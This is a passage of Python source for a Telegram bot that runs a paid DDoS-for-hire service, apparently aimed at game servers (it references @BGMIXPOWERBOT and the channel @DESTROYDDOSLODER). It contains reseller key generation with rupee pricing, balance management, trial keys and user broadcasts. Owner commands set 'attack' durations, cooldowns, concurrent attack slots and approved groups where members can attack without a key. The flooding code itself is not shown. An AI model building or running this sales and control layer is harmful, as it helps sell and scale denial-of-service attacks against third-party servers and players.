        duration_key = command_parts[1].lower()
        if duration_key not in RESELLER_PRICING:
            bot.reply_to(message, "Invalid duration!\n\nValid: 12h, 1d, 3d, 7d, 30d, 60d")
            return
        try:
            count = int(command_parts[2])
            if count < 1 or count > 20:
                bot.reply_to(message, "Count 1-20 ke beech hona chahiye!")
                return
        except:
            bot.reply_to(message, "Invalid count!")
            return
        pricing = RESELLER_PRICING[duration_key]
        price = pricing['price']
        total_price = price * count
        balance = reseller.get('balance', 0)
        if balance < total_price:
            bot.reply_to(message, f"Insufficient balance!\n\nRequired: {total_price} Rs ({count} x {price})\nYour Balance: {balance} Rs\n\nBalance add karwao owner se!")
            return
        username = message.from_user.username or str(user_id)
        generated_keys = []
        for _ in range(count):
            key = f"{KEY_PREFIX}{generate_key(12)}"
            key_doc = {'key': key, 'duration_seconds': pricing['seconds'], 'duration_label': pricing['label'], 'created_at': datetime.now(), 'created_by': user_id, 'created_by_username': username, 'created_by_type': 'reseller', 'used': False, 'used_by': None, 'used_at': None, 'max_users': 1}
            keys_collection.insert_one(key_doc)
            generated_keys.append(key)
        new_balance = balance - total_price
        resellers_collection.update_one({'user_id': user_id}, {'$set': {'balance': new_balance}, '$inc': {'total_keys_generated': count}})
        try:
            keys_list_str = "\n".join([f"<code>/redeem {k}</code>" for k in generated_keys])
            owner_msg = f"<b>Reseller Key Notification</b>\n\n<b>Reseller:</b> {username} ({user_id})\n<b>Keys Generated:</b> {count}\n<b>Duration:</b> {pricing['label']}\n<b>Total Cost:</b> {total_price} Rs\n<b>Remaining Balance:</b> {new_balance} Rs\n\n<b>Keys:</b>\n{keys_list_str}"
            bot.send_message(BOT_OWNER, owner_msg, parse_mode="HTML")
        except Exception as e:
            print(f"Failed to notify owner: {e}")
        if count == 1:
            bot.reply_to(message, f"<b>Key Generated!</b>\n\n<code>/redeem {generated_keys[0]}</code>\n\n<b>Duration:</b> {pricing['label']}\n<b>Balance:</b> {new_balance} Rs", parse_mode="HTML")
        else:
            keys_text = "\n".join([f"<code>/redeem {k}</code>" for k in generated_keys])
            bot.reply_to(message, f"<b>{count} Keys Generated!</b>\n\n{keys_text}\n\n<b>Duration:</b> {pricing['label']}\n<b>Cost:</b> {total_price} Rs\n<b>Balance:</b> {new_balance} Rs", parse_mode="HTML")
    else:
        bot.reply_to(message, "Ye command sirf owner/reseller use kar sakta hai!")

@bot.message_handler(commands=["add_reseller"])
def add_reseller_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "Usage: /add_reseller <id or @username>")
        return
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        bot.reply_to(message, "User nahi mila!")
        return
    existing = resellers_collection.find_one({'user_id': reseller_id})
    if existing:
        bot.reply_to(message, "Ye user pehle se reseller hai!")
        return
    reseller_doc = {'user_id': reseller_id, 'username': resolved_name, 'balance': 0, 'added_at': datetime.now(), 'added_by': user_id, 'blocked': False, 'total_keys_generated': 0}
    resellers_collection.insert_one(reseller_doc)
    try:
        bot.send_message(reseller_id, "Congratulations! Aap ab Reseller ban gaye ho!\n\nUse /mysaldo to check balance\nUse /gen to generate keys\nUse /prices to see pricing")
    except:
        pass
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    bot.reply_to(message, f"Reseller added!\n\nUser: {display}\nID: {reseller_id}\nBalance: 0 Rs")

@bot.message_handler(commands=["remove_reseller"])
def remove_reseller_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "Usage: /remove_reseller <id or @username>")
        return
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        bot.reply_to(message, "User nahi mila!")
        return
    result = resellers_collection.delete_one({'user_id': reseller_id})
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    if result.deleted_count > 0:
        bot.reply_to(message, f"Reseller {display} removed!")
    else:
        bot.reply_to(message, "Reseller nahi mila!")

@bot.message_handler(commands=["block_reseller"])
def block_reseller_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "Usage: /block_reseller <id or @username>")
        return
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        bot.reply_to(message, "User nahi mila!")
        return
    result = resellers_collection.update_one({'user_id': reseller_id}, {'$set': {'blocked': True}})
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    if result.modified_count > 0:
        bot.reply_to(message, f"Reseller {display} blocked!")
    else:
        bot.reply_to(message, "Reseller nahi mila ya pehle se blocked hai!")

@bot.message_handler(commands=["unblock_reseller"])
def unblock_reseller_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "Usage: /unblock_reseller <id or @username>")
        return
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        bot.reply_to(message, "User nahi mila!")
        return
    result = resellers_collection.update_one({'user_id': reseller_id}, {'$set': {'blocked': False}})
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    if result.modified_count > 0:
        bot.reply_to(message, f"Reseller {display} unblocked!")
    else:
        bot.reply_to(message, "Reseller nahi mila!")

@bot.message_handler(commands=["saldo_add"])
def saldo_add_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) != 3:
        bot.reply_to(message, "Usage: /saldo_add <id or @username> <amount>")
        return
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        bot.reply_to(message, "User nahi mila!")
        return
    try:
        amount = int(command_parts[2])
    except ValueError:
        bot.reply_to(message, "Invalid amount!")
        return
    if amount <= 0:
        bot.reply_to(message, "Amount must be positive!")
        return
    reseller = resellers_collection.find_one({'user_id': reseller_id})
    if not reseller:
        bot.reply_to(message, "Reseller nahi mila!")
        return
    new_balance = reseller.get('balance', 0) + amount
    resellers_collection.update_one({'user_id': reseller_id}, {'$set': {'balance': new_balance}})
    try:
        bot.send_message(reseller_id, f"Balance Added!\n\nAdded: {amount} Rs\nNew Balance: {new_balance} Rs")
    except:
        pass
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    bot.reply_to(message, f"Balance Added!\n\nReseller: {display}\nID: {reseller_id}\nAdded: {amount} Rs\nNew Balance: {new_balance} Rs")

@bot.message_handler(commands=["saldo_remove"])
def saldo_remove_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) != 3:
        bot.reply_to(message, "Usage: /saldo_remove <id or @username> <amount>")
        return
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        bot.reply_to(message, "User nahi mila!")
        return
    try:
        amount = int(command_parts[2])
    except ValueError:
        bot.reply_to(message, "Invalid amount!")
        return
    reseller = resellers_collection.find_one({'user_id': reseller_id})
    if not reseller:
        bot.reply_to(message, "Reseller nahi mila!")
        return
    new_balance = max(0, reseller.get('balance', 0) - amount)
    resellers_collection.update_one({'user_id': reseller_id}, {'$set': {'balance': new_balance}})
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    bot.reply_to(message, f"Balance Removed!\n\nReseller: {display}\nID: {reseller_id}\nRemoved: {amount} Rs\nNew Balance: {new_balance} Rs")

@bot.message_handler(commands=["saldo"])
def saldo_check_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "Usage: /saldo <id or @username>")
        return
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        bot.reply_to(message, "User nahi mila!")
        return
    reseller = resellers_collection.find_one({'user_id': reseller_id})
    if not reseller:
        bot.reply_to(message, "Reseller nahi mila!")
        return
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    bot.reply_to(message, f"Reseller Balance\n\nUser: {display}\nID: {reseller_id}\nBalance: {reseller.get('balance', 0)} Rs\nTotal Keys: {reseller.get('total_keys_generated', 0)}\nStatus: {'Blocked' if reseller.get('blocked') else 'Active'}")

@bot.message_handler(commands=["all_resellers"])
def all_resellers_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    resellers = list(resellers_collection.find())
    if not resellers:
        bot.reply_to(message, "Koi reseller nahi hai!")
        return
    response = "RESELLER LIST\n=============\n\n"
    active_resellers = [r for r in resellers if not r.get('blocked')]
    blocked_resellers = [r for r in resellers if r.get('blocked')]
    response += f"ACTIVE: {len(active_resellers)}\n--------------------\n"
    for i, r in enumerate(active_resellers[:10], 1):
        response += f"{i}. {r['user_id']}\n   Balance: {r.get('balance', 0)} Rs\n   Keys: {r.get('total_keys_generated', 0)}\n\n"
    if blocked_resellers:
        response += f"BLOCKED: {len(blocked_resellers)}\n--------------------\n"
        for i, r in enumerate(blocked_resellers[:5], 1):
            response += f"{i}. {r['user_id']}\n"
    response += "\n============="
    bot.reply_to(message, response)

@bot.message_handler(commands=["mysaldo"])
def my_saldo_command(message):
    if check_banned(message): return
    user_id = message.from_user.id
    reseller = get_reseller(user_id)
    if not reseller:
        bot.reply_to(message, "Aap reseller nahi ho!")
        return
    if reseller.get('blocked'):
        bot.reply_to(message, "Aapka panel blocked hai!")
        return
    bot.reply_to(message, f"Your Balance\n\nBalance: {reseller.get('balance', 0)} Rs\nTotal Keys Generated: {reseller.get('total_keys_generated', 0)}\n\nUse /prices to see key prices\nUse /gen <duration> to generate key")

@bot.message_handler(commands=["prices"])
def prices_command(message):
    if check_banned(message): return
    user_id = message.from_user.id
    if not is_reseller(user_id) and not is_owner(user_id):
        bot.reply_to(message, "Ye command sirf resellers ke liye hai!")
        return
    update_reseller_pricing()
    response = "KEY PRICING\n===========\n\n"
    durations = ['12h', '1d', '3d', '7d', '30d', '60d']
    for dur in durations:
        if dur in RESELLER_PRICING:
            info = RESELLER_PRICING[dur]
            response += f"{info['label']} -> {info['price']} Rs\n"
    response += "\n===========\nUsage: /gen <duration> <count>\nExample: /gen 1d 1\n==========="
    bot.reply_to(message, response)

@bot.message_handler(commands=["prot_on"])
def prot_on_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    bot_settings_collection.update_one({}, {"$set": {"port_protection": True}}, upsert=True)
    bot.reply_to(message, "Port Spam Protection enabled!")

@bot.message_handler(commands=["prot_off"])
def prot_off_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    bot_settings_collection.update_one({}, {"$set": {"port_protection": False}}, upsert=True)
    bot.reply_to(message, "Port Spam Protection disabled!")

@bot.message_handler(commands=["ddos_on"])
def ddos_on_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    set_ddos_protection(True)
    protection.enabled = True
    bot.reply_to(message, "DDoS Protection: ENABLED\n\nRate limit: 30 req/sec\nUser limit: 5 req/5 sec")

@bot.message_handler(commands=["ddos_off"])
def ddos_off_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    set_ddos_protection(False)
    protection.enabled = False
    bot.reply_to(message, "DDoS Protection: DISABLED\n\nAll rate limits removed!")

@bot.message_handler(commands=["required_on"])
def required_on_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    set_channel_required(True)
    bot.reply_to(message, "Channel join REQUIRED now!\n\nUsers must join @DESTROYDDOSLODER to attack.")

@bot.message_handler(commands=["required_off"])
def required_off_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    set_channel_required(False)
    bot.reply_to(message, "Channel join NOT required now!\n\nUsers can attack without joining any channel.")

@bot.message_handler(commands=["addgrp"])
def add_group_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "Usage: /addgrp <group_id>\n\nExample: /addgrp -1001234567890")
        return
    try:
        group_id = int(command_parts[1])
    except ValueError:
        bot.reply_to(message, "Invalid group ID!")
        return
    if add_approved_group(group_id):
        bot.reply_to(message, f"Group Approved!\n\nGroup ID: <code>{group_id}</code>\n\nNow all members can attack in this group without key!\nMax Time: {get_group_max_attack_time()}s\nCooldown: {get_group_cooldown()}s\nDDoS: {'ON' if get_ddos_protection() else 'OFF'}\nChannel: {'Required' if get_channel_required() else 'Not Required'}\nMax Slots: {len(API_LIST)}", parse_mode="HTML")
    else:
        bot.reply_to(message, f"Group {group_id} already approved!")

@bot.message_handler(commands=["removegrp"])
def remove_group_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "Usage: /removegrp <group_id>")
        return
    try:
        group_id = int(command_parts[1])
    except ValueError:
        bot.reply_to(message, "Invalid group ID!")
        return
    if remove_approved_group(group_id):
        bot.reply_to(message, f"Group Removed!\n\nGroup ID: <code>{group_id}</code>", parse_mode="HTML")
    else:
        bot.reply_to(message, f"Group {group_id} not found!")

@bot.message_handler(commands=["addlink"])
def add_channel_link_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    bot.reply_to(message, "Sirf ek channel allowed hai: @DESTROYDDOSLODER")

@bot.message_handler(commands=["removelink"])
def remove_channel_link_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    bot.reply_to(message, "@DESTROYDDOSLODER remove nahi kar sakte.")

@bot.message_handler(commands=["channels"])
def channels_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    response = "REQUIRED CHANNEL\n================\n\n"
    response += f"Status: {'REQUIRED' if get_channel_required() else 'NOT REQUIRED'}\n\n"
    response += "Only one channel:\n- https://t.me/DESTROYDDOSLODER (@DESTROYDDOSLODER)\n\n"
    response += "Use /required_on or /required_off to toggle."
    bot.reply_to(message, response)

@bot.message_handler(commands=["groups"])
def groups_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    approved = get_approved_groups()
    response = "APPROVED GROUPS\n===============\n\n"
    response += f"Max Time: {get_group_max_attack_time()}s\nCooldown: {get_group_cooldown()}s\nDDoS: {'ON' if get_ddos_protection() else 'OFF'}\nChannel: {'Required' if get_channel_required() else 'Not Required'}\nKey Required: NO\nMax Slots: {len(API_LIST)}\n\n"
    if approved:
        response += f"Total: {len(approved)}\n\n"
        for i, gid in enumerate(approved, 1):
            response += f"{i}. <code>{gid}</code>\n"
    else:
        response += "No groups approved!\n"
    response += "\n===============\nCommands:\n- /addgrp <id>\n- /removegrp <id>"
    bot.reply_to(message, response, parse_mode="HTML")

@bot.message_handler(commands=["private_max"])
def private_max_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) == 1:
        current = get_private_max_attack_time()
        bot.reply_to(message, f"Current Private Max Attack Time: {current}s\n\nChange: /private_max <seconds>")
        return
    try:
        new_value = int(command_parts[1])
        if new_value < 10 or new_value > 600:
            bot.reply_to(message, "Value 10-600 seconds ke beech hona chahiye!")
            return
        set_setting('private_max_attack_time', new_value)
        bot.reply_to(message, f"Private Max Attack Time set: {new_value}s")
    except ValueError:
        bot.reply_to(message, "Invalid number!")

@bot.message_handler(commands=["group_max"])
def group_max_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) == 1:
        current = get_group_max_attack_time()
        bot.reply_to(message, f"Current Group Max Attack Time: {current}s\n\nChange: /group_max <seconds>")
        return
    try:
        new_value = int(command_parts[1])
        if new_value < 10 or new_value > 300:
            bot.reply_to(message, "Value 10-300 seconds ke beech hona chahiye!")
            return
        set_setting('group_max_attack_time', new_value)
        bot.reply_to(message, f"Group Max Attack Time set: {new_value}s")
    except ValueError:
        bot.reply_to(message, "Invalid number!")

@bot.message_handler(commands=["private_cooldown"])
def private_cooldown_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) == 1:
        current = get_private_cooldown()
        bot.reply_to(message, f"Current Private Cooldown: {current}s\n\nChange: /private_cooldown <seconds>")
        return
    try:
        new_value = int(command_parts[1])
        if new_value < 0 or new_value > 3600:
            bot.reply_to(message, "Value 0-3600 seconds ke beech hona chahiye!")
            return
        set_setting('private_cooldown', new_value)
        bot.reply_to(message, f"Private Cooldown set: {new_value}s")
    except ValueError:
        bot.reply_to(message, "Invalid number!")

@bot.message_handler(commands=["group_cooldown"])
def group_cooldown_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) == 1:
        current = get_group_cooldown()
        bot.reply_to(message, f"Current Group Cooldown: {current}s\n\nChange: /group_cooldown <seconds>")
        return
    try:
        new_value = int(command_parts[1])
        if new_value < 0 or new_value > 3600:
            bot.reply_to(message, "Value 0-3600 seconds ke beech hona chahiye!")
            return
        set_setting('group_cooldown', new_value)
        bot.reply_to(message, f"Group Cooldown set: {new_value}s")
    except ValueError:
        bot.reply_to(message, "Invalid number!")

@bot.message_handler(commands=["settings"])
def settings_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    response = "BOT SETTINGS\n============\n\n"
    response += f"PRIVATE\n- Max Time: {get_private_max_attack_time()}s\n- Cooldown: {get_private_cooldown()}s\n- Key: YES\n- DDoS: {'ON' if get_ddos_protection() else 'OFF'}\n- Channel: {'Required' if get_channel_required() else 'Not Required'}\n\n"
    response += f"GROUP\n- Max Time: {get_group_max_attack_time()}s\n- Cooldown: {get_group_cooldown()}s\n- Key: NO\n- DDoS: {'ON' if get_ddos_protection() else 'OFF'}\n- Channel: {'Required' if get_channel_required() else 'Not Required'}\n- Groups: {len(get_approved_groups())}\n\n"
    response += f"SLOTS\n- Max Concurrent Attacks: {len(API_LIST)}\n\n"
    response += f"CHANNEL\n- @DESTROYDDOSLODER\n- Status: {'REQUIRED' if get_channel_required() else 'NOT REQUIRED'}\n- Toggle: /required_on /required_off\n\n"
    response += f"REEL FEATURE\n- Status: {'ON' if get_reel_enabled() else 'OFF'}\n- Total Reels: {len(get_reel_list())}\n- Commands: /reel_on, /reel_off, /addreel, /removereel, /listreels\n\n"
    response += f"FEEDBACK\n- Status: {'ON' if get_feedback_enabled() else 'OFF'}\n- Toggle: /feedback_on /feedback_off\n\n"
    response += f"SETUP COMMANDS\n- /setcanary /setios /setandroid\n- /setupstatus /delsetup\n\n"
    response += "Commands:\n/private_max <sec>\n/group_max <sec>\n/private_cooldown <sec>\n/group_cooldown <sec>\n/ddos_on /ddos_off\n/required_on /required_off\n/addgrp /removegrp"
    bot.reply_to(message, response)

@bot.message_handler(commands=["reseller_trail", "reseller_trial"])
def reseller_trail_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) != 3:
        bot.reply_to(message, "Usage: /reseller_trail <hours> <max_users>")
        return
    try:
        hours = int(command_parts[1])
        max_users = int(command_parts[2])
    except ValueError:
        bot.reply_to(message, "Invalid hours or max_users!")
        return
    resellers = list(resellers_collection.find({'blocked': {'$ne': True}}))
    if not resellers:
        bot.reply_to(message, "Koi active reseller nahi hai!")
        return
    sent_count = 0
    for reseller in resellers:
        reseller_id = reseller['user_id']
        try:
            chat = bot.get_chat(reseller_id)
            reseller_username = chat.username or str(reseller_id)
        except:
            reseller_username = str(reseller_id)
        key = f"{KEY_PREFIX}{generate_key(12)}"
        key_doc = {'key': key, 'duration_seconds': hours * 3600, 'duration_label': f"{hours} hours (Reseller Trail)", 'created_at': datetime.now(), 'created_by': message.from_user.id, 'created_by_username': reseller_username, 'created_by_type': 'reseller_trail', 'used': False, 'used_by': None, 'used_at': None, 'max_users': max_users, 'current_users': 0, 'is_trail': True, 'reseller_id': reseller_id}
        keys_collection.insert_one(key_doc)
        try:
            bot.send_message(reseller_id, f"<b>Trail Key Generated!</b>\n\n/redeem <code>{key}</code>\n\n<b>Duration:</b> {hours} hours\n<b>Max Users:</b> {max_users}\n\nBot - @BGMIXPOWERBOT\n\n<i>Ye key {max_users} users use kar sakte hai.</i>\n<i>Key pe tap karke copy karo, phir /redeem me paste karo.</i>", parse_mode="HTML")
            sent_count += 1
        except:
            pass
    bot.reply_to(message, f"Reseller Trail Keys Sent!\nResellers: {len(resellers)}\nSent: {sent_count}")

@bot.message_handler(commands=["trail", "trial"])
def owner_trail_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) != 3:
        bot.reply_to(message, "Usage: /trail <duration> <max_users>\n\nExample: /trail 1d 5\n(1 key banegi jisme 5 users use kar sakte hai)")
        return
    duration_str = command_parts[1].lower()
    duration, duration_label = parse_duration(duration_str)
    if not duration:
        bot.reply_to(message, "Invalid duration!\nUse: s/m/h/d\nExample: 1d, 12h, 30m")
        return
    try:
        max_users = int(command_parts[2])
        if max_users < 1 or max_users > 100:
            bot.reply_to(message, "Max users 1-100 ke beech hona chahiye!")
            return
    except ValueError:
        bot.reply_to(message, "Invalid max_users!")
        return
    key = f"{KEY_PREFIX}{generate_key(12)}"
    key_doc = {'key': key, 'duration_seconds': int(duration.total_seconds()), 'duration_label': f"{duration_label} (Owner Trail)", 'created_at': datetime.now(), 'created_by': message.from_user.id, 'created_by_type': 'owner_trail', 'used': False, 'used_by': None, 'used_at': None, 'max_users': max_users, 'current_users': 0, 'is_trail': True}
    keys_collection.insert_one(key_doc)
    bot.reply_to(message, f"<b>Trail Key Generated!</b>\n\n/redeem <code>{key}</code>\n\n<b>Duration:</b> {duration_label}\n<b>Max Users:</b> {max_users}\n\nBot - @BGMIXPOWERBOT\n\n<i>Ye key {max_users} users use kar sakte hai.</i>\n<i>Key pe tap karke copy karo, phir /redeem me paste karo.</i>", parse_mode="HTML")

@bot.message_handler(commands=["user_resell"])
def user_resell_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "Usage: /user_resell <id or @username>")
        return
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        bot.reply_to(message, "User nahi mila!")
        return
    keys = list(keys_collection.find({'created_by': reseller_id, 'used': True}))
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    if not keys:
        bot.reply_to(message, f"{display} ke koi users nahi!")
        return
    response = f"{display} USERS\n==========\n\n"
    for i, key in enumerate(keys[:15], 1):
        user = users_collection.find_one({'key': key['key']})
        if user:
            response += f"{i}. {user.get('username', 'Unknown')}\n   ID: <code>{user['user_id']}</code>\n   Key: <code>{key['key']}</code>\n\n"
    response += f"==========\nTotal Users: {len(keys)}"
    bot.reply_to(message, response, parse_mode="HTML")

pending_broadcast = {}
pending_broadcast_reseller = {}
_broadcast_lock = threading.Lock()

@bot.message_handler(commands=["broadcast_paid"])
def broadcast_paid_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        bot.reply_to(message, "Usage: /broadcast_paid <message>")
        return
    broadcast_msg = command_parts[1]
    now = datetime.now()
    active_subscribers = list(users_collection.find({'key_expiry': {'$gt': now}}))
    if not active_subscribers:
        bot.reply_to(message, "Koi active subscribers nahi!")
        return
    sent_count = 0
    fail_count = 0
    progress_msg = bot.reply_to(message, f"Broadcasting to {len(active_subscribers)} paid users...")
    for user in active_subscribers:
        try:
            target_id = user['user_id']
            if target_id == BOT_OWNER:
                continue
            bot.send_message(target_id, f"PAID USER ANNOUNCEMENT\n\n{broadcast_msg}")
            sent_count += 1
            time.sleep(0.05)
        except Exception:
            fail_count += 1
    bot.edit_message_text(f"Broadcast Complete!\n\nSent: {sent_count} paid users\nFailed: {fail_count}", message.chat.id, progress_msg.message_id)

@bot.message_handler(commands=["broadcast"])
def broadcast_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    user_id = message.from_user.id
    reply_msg = message.reply_to_message
    command_parts = message.text.split(maxsplit=1)
    if not reply_msg and len(command_parts) < 2:
        bot.reply_to(message, "Usage:\n- /broadcast <message>\n- Reply to a message and /broadcast")
        return
    all_users = list(users_collection.find())
    all_resellers = list(resellers_collection.find())
    all_bot_users = list(bot_users_collection.find())
    all_user_ids = set()
    for u in all_users:
        all_user_ids.add(u['user_id'])
    for r in all_resellers:
        all_user_ids.add(r['user_id'])
    for bu in all_bot_users:
        all_user_ids.add(bu['user_id'])
    if reply_msg:
        pending_broadcast[user_id] = {'type': 'reply', 'message': reply_msg, 'users': all_user_ids}
        content_type = "Photo" if reply_msg.photo else "Video" if reply_msg.video else "Document" if reply_msg.document else "Poll" if reply_msg.poll else "Audio" if reply_msg.audio else "Sticker" if reply_msg.sticker else "Text"
        bot.reply_to(message, f"Broadcast Confirmation\n\nContent: {content_type}\nUsers: {len(all_user_ids)}\n\n/confirm_broadcast\n/cancel_broadcast")
    else:
        broadcast_msg = command_parts[1]
        pending_broadcast[user_id] = {'type': 'text', 'message': broadcast_msg, 'users': all_user_ids}
        bot.reply_to(message, f"Broadcast Confirmation\n\nMessage: {broadcast_msg[:100]}{'...' if len(broadcast_msg) > 100 else ''}\nUsers: {len(all_user_ids)}\n\n/confirm_broadcast\n/cancel_broadcast")

@bot.message_handler(commands=["confirm_broadcast"])
def confirm_broadcast_command(message):
    if not is_owner(message.from_user.id):
        return
    user_id = message.from_user.id
    if user_id not in pending_broadcast:
        bot.reply_to(message, "Pehle /broadcast karo!")
        return
    data = pending_broadcast[user_id]
    del pending_broadcast[user_id]
    sent_count = 0
    failed_count = 0
    for uid in data['users']:
        try:
            if data['type'] == 'text':
                bot.send_message(uid, f"BROADCAST\n\n{data['message']}")
            else:
                bot.copy_message(uid, data['message'].chat.id, data['message'].message_id)
            sent_count += 1
        except:
            failed_count += 1
    bot.reply_to(message, f"Broadcast Sent!\n\nTotal: {len(data['users'])}\nDelivered: {sent_count}\nFailed: {failed_count}")

@bot.message_handler(commands=["cancel_broadcast"])
def cancel_broadcast_command(message):
    if not is_owner(message.from_user.id):
        return
    user_id = message.from_user.id
    cancelled = False
    if user_id in pending_broadcast:
        del pending_broadcast[user_id]
        cancelled = True
    if user_id in pending_broadcast_reseller:
        del pending_broadcast_reseller[user_id]
        cancelled = True
    if cancelled:
        bot.reply_to(message, "Broadcast cancelled!")
    else:
        bot.reply_to(message, "Koi pending broadcast nahi hai.")

@bot.message_handler(commands=["broadcast_reseller"])
def broadcast_reseller_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    user_id = message.from_user.id
    reply_msg = message.reply_to_message
    command_parts = message.text.split(maxsplit=1)
    if not reply_msg and len(command_parts) < 2:
        bot.reply_to(message, "Usage:\n- /broadcast_reseller <message>\n- Reply to a message")
        return
    resellers = list(resellers_collection.find())
    reseller_ids = set(r['user_id'] for r in resellers)
    if reply_msg:
        pending_broadcast_reseller[user_id] = {'type': 'reply', 'message': reply_msg, 'users': reseller_ids}
        content_type = "Photo" if reply_msg.photo else "Video" if reply_msg.video else "Document" if reply_msg.document else "Poll" if reply_msg.poll else "Audio" if reply_msg.audio else "Sticker" if reply_msg.sticker else "Text"
        bot.reply_to(message, f"Reseller Broadcast Confirmation\n\nContent: {content_type}\nResellers: {len(reseller_ids)}\n\n/confirm_broadcast_reseller\n/cancel_broadcast")
    else:
        broadcast_msg = command_parts[1]
        pending_broadcast_reseller[user_id] = {'type': 'text', 'message': broadcast_msg, 'users': reseller_ids}
        bot.reply_to(message, f"Reseller Broadcast Confirmation\n\nMessage: {broadcast_msg[:100]}{'...' if len(broadcast_msg) > 100 else ''}\nResellers: {len(reseller_ids)}\n\n/confirm_broadcast_reseller\n/cancel_broadcast")

@bot.message_handler(commands=["confirm_broadcast_reseller"])
def confirm_broadcast_reseller_command(message):
    if not is_owner(message.from_user.id):
        return
    user_id = message.from_user.id
    if user_id not in pending_broadcast_reseller:
        bot.reply_to(message, "Pehle /broadcast_reseller karo!")
        return
    data = pending_broadcast_reseller[user_id]
    del pending_broadcast_reseller[user_id]
    sent_count = 0
    failed_count = 0
    for uid in data['users']:
        try:
            if data['type'] == 'text':
                bot.send_message(uid, f"RESELLER NOTICE\n\n{data['message']}")
            else:
